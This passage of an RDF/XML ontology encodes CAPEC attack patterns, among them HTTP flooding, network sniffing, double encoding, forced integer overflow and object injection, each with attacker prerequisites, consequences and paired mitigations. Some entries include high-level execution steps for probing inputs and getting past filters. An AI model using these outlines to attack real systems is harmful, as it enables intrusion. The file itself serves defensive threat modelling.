      <j.0:Id rdf:about="http://krstProj.com/capec#488">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:125::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#HTTP Flood"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack136">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#488"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege::Design: Harden registry server and file access permissions::Implementation: Implement communications to and from the registry using secure protocols::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack417"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker268">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#473"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack268"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::20::327::290::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.::The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Technical understanding of how signature verification algorithms work with data and applications:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker135">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#571"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack135"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  an organization can monitor the typical traffic flow. When spikes in usage occur  filters could examine traffic for indicators of bad behavior with respect to the web servers  and then create firewall rules to deny the malicious IP addresses. These patterns in the filter could be a combination of trained behavior  knowledge of standards as they apply to the web server  known patterns  or anomaly detection. Firewalling source IPs works since the HTTP is sent using TCP so the source IP can&apos;t be spoofed; if the source IP is spoofed is  then it&apos;s not legitimate traffic. Special care should be taken care with rule sets to ensure low false positive rates along with a method at the application layer to allow a valid user to begin using the service again. Another possible solution is using 3rd party providers as they have experts  knowledge  experience  and resources to deal with the attack and mitigate it before hand or while it occurs. The best mitigation is preparation before an attack  but there is no bulletproof solution as with ample resources a brute force attack may succeed.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack136"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Many tools are available to search for the hidden data. Scan regularly for such data using one of these tools.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack376">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#636">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:165::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Hiding Malicious Data or Code within Files"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure proper permissions on directories that are accessible through a web server. Disallow remote access to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack14">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#563">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:17::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Add Malicious File to Shared Webroot"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker267">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#234"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack267"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::732::648::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker134">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#113"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack134"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::227::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The requirements vary depending upon the nature of the API. For application-layer APIs related to the processing of the HTTP protocol  one or more of the following may be needed: a MITM (Man-In-The-Middle) proxy  a web browser  or a programming/scripting language.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker390">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#585"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack390"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This attack pattern requires that the adversary has cooperation from the registrar of the target domain.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::This attack may be mitigated through egress filtering based on ICMP payload so a network is a good neighbor to other networks. Bad IP implementations become patched  so using the proper version of a browser or OS is recommended.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack300">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#496">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:130::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#ICMP Fragmentation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::404::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that proper permissions on files and folders are enacted to limit accessibility.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack96">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#577">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Owner Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify unnecessary system utilities or potentially malicious software that may contain functionality to identify network share information  and audit and/or block them by using whitelisting tools.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack51"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use a language or compiler that performs automatic bounds checking.::Carefully review the service&apos;s implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as integer overflow.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Always do bound checking before consuming user input data.::::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack451">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#92">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:128::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Forced Integer Overflow"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::190::128::120::122::196::680::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The first step is exploratory meaning the attacker looks for an integer variable that he can control.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker finds an integer variable that he can write into or manipulate and try to get the value of the integer out of the possible range.::STEP:3:PHASE:Exploit:DESCRIPTION:The integer variable is forced to have a value out of range which set its final value to an unexpected value.::STEP:4:PHASE:Exploit:DESCRIPTION:The target host acts on the data and unexpected behavior may happen.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Assess software and software components during development and prior to deployment to ensure that they function as intended and without any malicious functionality.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack146">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#444">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:438::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Development Alteration"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:IntegrityTECHNICAL IMPACT:Alter Execution Logic::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that protocols have specific limits of scale configured.::Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.::Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack39">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#125">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Flooding"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::404::770::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful flooding attack compromises the availability of the target system&apos;s service by exhausting its available resources.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Validate object before deserialization process Design: Limit which types can be deserialized. Implementation: Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. Whitelist acceptable classes. Implementation: Keep session state on the server  when possible.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack32">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#586">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Object Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::502::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption If a function is making an assumption on when to terminate  based on a sentry in a string  it could easily never terminate and exhaust available resources.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Attackers can modify objects or data that was assumed to be safe from modification.::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Functions that assume information in the deserialized object is valid could be exploited.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker261">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#477"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack261"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::693::311::319::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Signer and recipient are using complex data storage structures that allow for a mix between signed and unsigned data::Recipient is using signature verification software that does not maintain separation between signed and unsigned data once the signature has been verified.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker may need to continuously monitor a stream of signed data  waiting for an exploitable message to appear.:LEVEL:High::SKILL:Attacker must be able to create malformed data blobs and know how to insert them in a location that the recipient will visit.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories  programs  and interfaces that grant direct access to executables.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack213"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Frequent changing of mobile number.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack405"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker395">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#158">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:157::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Sniffing Network Traffic"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack395">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#158"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::311::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::311::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must be communicating on a network protocol visible by a network sniffing application.::The adversary must obtain a logical position on the network from intercepting target network traffic is possible. Depending on the network topology  traffic sniffing may be simple or challenging. If both the target sender and target recipient are members of a single subnet  the adversary must also be on that subnet in order to see their traffic communication.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries can obtain and set up open-source network sniffing tools easily.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A tool with the capability of presenting network communication traffic (e.g.  Wireshark  tcpdump  Cain and Abel  etc.).::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker262">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#183"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack262"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::77::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.::The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.::The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. However  in most cases  the attacker will need to be a recognized user of the web-mail server.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so  implement specific  white-list approach.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack441"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker393">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#157">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:117::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Sniffing Attacks"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack393">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#157"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::311::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::311::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target data stream must be transmitted on a medium to which the adversary has access.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient  the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g.  a network sniffing tool)::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker260">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#168"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack260"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::212::69::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must be running the Microsoft NTFS file system.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have command line or programmatic access to the target&apos;s files system with write/read permissions.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.::When client input is required from web-based forms  avoid using the GET method to submit data  as the method causes the form data to be appended to the URL and is easily manipulated. Instead  use the POST method whenever possible.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process  if bad character are left after decoding process  treat the data as suspicious  and fail the validation process.::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However  that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack468"/>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack436">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#120">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Double Encoding"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::173::172::177::181::171::183::184::21::74::20::697::692::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application for user-controllable inputs) Using a browser  an automated tool or by inspecting the application  an attacker records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe entry points to locate vulnerabilities) Try double-encoding for parts of the input in order to try to get past the filters. For instance  by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection  SQL injection  etc.TECHNIQUE:Try to use double-encoding to bypass validation routines.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use a strict session management mechanism that only accepts locally generated session identifiers: This prevents attackers from fixating session identifiers of their own choice.::Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier  a new one is issued when the level of privilege changes.::Use session identifiers that are difficult to guess or brute-force: One way for the attackers to obtain valid session identifiers is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random  brute-forcing or guessing becomes very difficult.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack442"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker394">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#28"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack394"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::74::388::20::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:There is a wide variety of fuzzing tools available.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
